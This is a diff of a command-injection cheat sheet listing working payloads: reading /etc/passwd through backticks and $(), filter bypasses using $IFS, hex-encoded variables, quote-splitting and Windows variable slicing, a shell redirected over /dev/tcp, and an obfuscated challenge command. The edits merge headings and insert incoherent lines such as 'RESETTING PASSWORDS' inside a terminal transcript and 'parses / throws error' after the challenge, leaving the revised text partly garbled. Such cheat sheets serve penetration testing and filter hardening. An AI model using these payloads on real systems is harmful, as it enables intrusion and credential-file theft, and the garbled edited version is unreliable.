@@ -1,4 +1,4 @@
-# Command Injection
+# cmd.inject
 
 > Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
 
@@ -27,15 +27,11 @@
 * [References](#references)
     
 
-## Tools
+## Tools, Exploits, cmd
 
 * [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)
 
-## Exploits
-
-### Basic commands
-
-Execute the command and voila :p
+### Voila
 
 ```powershell
 cat /etc/passwd
@@ -61,11 +57,7 @@ original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```
 
-## Filter Bypasses
-
-### Bypass without space
-
-Works on Linux only.
+## Filter Bypasses | $
 
 ```powershell
 swissky@crashlab:~/Www$ cat</etc/passwd
@@ -88,6 +80,7 @@ swissky@crashlab:~$ X=$'uname\x20-a'&&$X
 Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 
 swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242
+**RESETTING PASSWORDS**
 ```
 
 Commands execution without spaces, $ or { } - Linux (Bash only)
@@ -96,7 +89,7 @@ Commands execution without spaces, $ or { } - Linux (Bash only)
 IFS=,;`cat<<<uname,-a`
 ```
 
-Works on Windows only.
+Windows only.
 
 ```powershell
 ping%CommonProgramFiles:~10,-18%IP
@@ -160,9 +153,7 @@ swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')p
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass Blacklisted words
-
-#### Bypass with single quote
+### Bypass Blacklisted words, single quote...
 
 ```powershell
 w'h'o'am'i
@@ -210,12 +201,13 @@ powershell C:\*\*2\n??e*d.*? # notepad
 
 ## Challenge
 
-Challenge based on the previous tricks, what does the following command do:
+Challenge based on the previous tricks, what does the following command do?
 
 ```powershell
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ```
-
+>parses
+>throws error
 ## Time based data exfiltration
 
 Extracting data : char by char
